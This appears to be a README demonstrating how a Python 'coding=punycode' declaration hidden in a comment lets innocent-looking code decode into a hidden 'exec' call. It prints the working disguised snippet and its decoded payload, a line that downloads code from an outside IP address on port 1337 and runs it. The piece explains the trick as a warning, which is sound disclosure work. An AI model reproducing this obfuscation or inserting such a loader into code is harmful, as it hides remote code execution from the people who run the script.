# The weird code

This is a demonstration that the encoding declarations ( https://docs.python.org/3/reference/lexical_analysis.html#encoding-declarations ) of python in conjunction with punycode encoding can be used to craft malicious code snippets that look benign.



## Demonstration Code

The code: <br>
(Note: copying this code may break it as described at the bottom of `The encoding used in the code`)

```py
#They say codying is fun, but I like puns, so when I code, coding!=funnycode, but coding=punycode ... anyways, here is some nice python code :)

I="I"
love="love"
python="python"

print(I, love, python)

# shift cipher!
def shift_cipher(s, key):
    return ("".join(chr((ord(c) + key) % 128) for c in s))

# this string is super secret, so I encrypted it!
secret="ymnx%nx%f%xjhwjy%rjxxflj&"

print(shift_cipher(secret, -5))

# I love python comments, so I put one more here with some crap <3:
# here is some crap: -47415qpygaa76ea29ah9daca59abba63qeacaacc99aad01ba90babbc80bf52ba42j1lla61b70aqa632n6a49a6a40b9a19aedb39aaead4agc17j4lb81kao43bip4nlafc6b63awaf14bvobfo1b48ac55bmava93bjap79km616kt0aa689f
```


## What does it do?
Lines with comments don't matter, right? <br>
So let's look at the code without comments first:

```py
I="I"
love="love"
python="python"

print(I, love, python)

def shift_cipher(s, key):
    return ("".join(chr((ord(c) + key) % 128) for c in s))

secret="ymnx%nx%f%xjhwjy%rjxxflj&"

print(shift_cipher(secret, -5))
```

Up to `print(I, love, python)` it is quite obvios: <br>
We just assign three variables and print them.
In python, printing multiple values with a single call to `print` will seperate them with a space.
So we get:

```
I love python
```

Next up is the `shift_cipher` function.
As the name indicates, it takes the character code of every character of the provided string and adds the key to it.
Then, ensures that it is between `0` and `128` (some ascii character) and converts it back to a character.

if we called `shift_cipher("abz", 1)` we would get `"bc{"` (`"{"` just happens to be the next character after `"z"`).

So if we shift `"ymnx%nx%f%xjhwjy%rjxxflj&"` by `-5`, we just have to look up the characters in an ascii table and subtract `5` and look at the character we get from that.
If we were to reach negative numbers we would have to wrap around starting at `127`.
But that never happens.

So, we expect the code to print `this is a secret message!`.


## But what does it REALLY do?

See, python is weird.
Comments are not always comments.
Especially in the first two lines, you can use comments to indicate how the python interpreter should do some things.


### Encoding

One thing you can specify is the encoding (The way how characters are encoded. This is relevant for characters that are bigger than 255 and thus cannot be represented in a single byte.).
By default, python is supposed to use `utf-8` (but I'm not sure this is the case on Windows.) - the most sensible encoding to use!
But if we want something else, we can add a comment in the first line specifying a different encoding like this:

```py
# coding=utf-16
```

More specifically it can also be in the second line, if the first line is a comment.
And, the interpreter searches for the following pattern: `coding[=:]\s*([-\w.]+)` - meaning `coding` followed directly by `=` or `:`, then an arbitrary amount of whitespace characters followed by an arbitrary amount (but at least one) of `.`, `-`, or characters that match `\w` (`a-z`, `A-Z`, `0-9`, and `_`).
One important observation: The interpreter searches this pattern ANYWHERE in the line, so the line can also contain a lot of crap apart from it.


### The encoding used in the code

So if we look through the first line of the script, we can find `coding=punycode` which matches the pattern!
So we use `punycode` to encode the file?
WTF is that?

You may know that Internet domains can contain emoji characters now (e.g., `i❤️.ws` is a valid domain).
However, everything that makes up the backbones of the internet can basically only handle ascii characters.
So punycode was invented to encode arbitrary emojis etc. in ascii strings.
Here is a link to wikipedia explaining it a bit (we will cover the important parts below anyways though): https://en.wikipedia.org/wiki/Punycode
For instance, `i❤️.ws` would be encoded as `xn--i-7iq.ws`.

The important parts of punycode encoding to understand the script is:
1. it keeps ascii characters the same and doesn't touch them
2. it removes all non-ascii characters but adds information on how to add them back in at the end of the encoded file
3. to mark the beginning of where the information to add characters back in starts, it adds a `-` character just before.

So after the last `-` character, there will be information on how to insert special characters into the script.

The reason this code may not work if you copy paste it around is that changes to whitespace or newlines (which are sometimes made by text editors) matter to the punycode encoding and will break the code.


### Looking at the ACTUAL code

I don't really understand the details of the encoding, but we can decode the script using python (this script just removes the first line containing the comment and decodes the rest using punycode):

```py
import sys
print("\n".join([l for l in open(sys.argv[1], "rb")][1:]).decode("punycode"))
```

We get the following code (see `decoded.py`):

```py


I="I"
love="love"
python="python"

print(I, love, python)

# shift cipher!
def shift_cipher(s, key):
    return ｅｘｅｃ("".join(chr((ord(c) + key) % 128) for c in s))

# this string is super secret, so I encrypted it!
secret="﩮全冀充勺啕逸喙勺况况﩮逸勉勺頻勇喙頻喝啕逸辶喝逸充﨏頻墳頻難鶴充勉喙勺况充冀頻侀鶴﨧舘啕啕冀憎勤勤層嘆勉喝屮喝勉喝悔嘆勉喝卑卑憎喝器器屮勤逸響﨧郞勉勺頻辶響鶴郞勉響頻難充響頻鶴郞郞﨨ymnx%nx%f%xjhwjy%rjxxflj&"

print(shift_cipher(secret, -5))

# I love python comments, so I put one more here with some crap <3:
# here is some crap: 
```

One other thing important in python is, that unicode characters that are letters (for example `ｅ`) are treated like their ascii counterparts (in this case `e`) for variable names.
So `ｅｘｅｃ` is the same as `exec`, but it disappears to the end of the file when encoding with punycode.

If you are new to python, `exec` basically takes a string and executes it as python code.
And `shift_cipher` no longer just decrypts the given string, but it also executes the result.
So if we give it ("encrypted") evil code, we may be in trouble.

We now also see that `secret` actually contains a whole lot of unicode characters, but what happens if we put them through `shift_cipher`?

The short answer is: Those symbols are chosen such that subtracting `5` from them does not convert them to usable code, but the `% 128` is also needed to make them useful.
With the `% 128` I can ensure that I can convert a unicode character that will be removed by punycode encoding and put at the end to any ascii character I want.
Thus, I can make that `shift_cipher` executes whatever python code I want after decrypting it without any characters in the python script changing except for the comment in the last line.

So what did I put into the string?
Let's decode it:

```py
import urllib.request as o
exec(o.urlopen("http://62.171.182.100:1337/bd").read().decode())#
```

This is bad!
The script sends a request to `http://62.171.182.100:1337/bd` and executes whatever it gets back.
So I basically can send arbitrary malicious python code and it gets executed!


## The moral of the story

Don't trust my code!
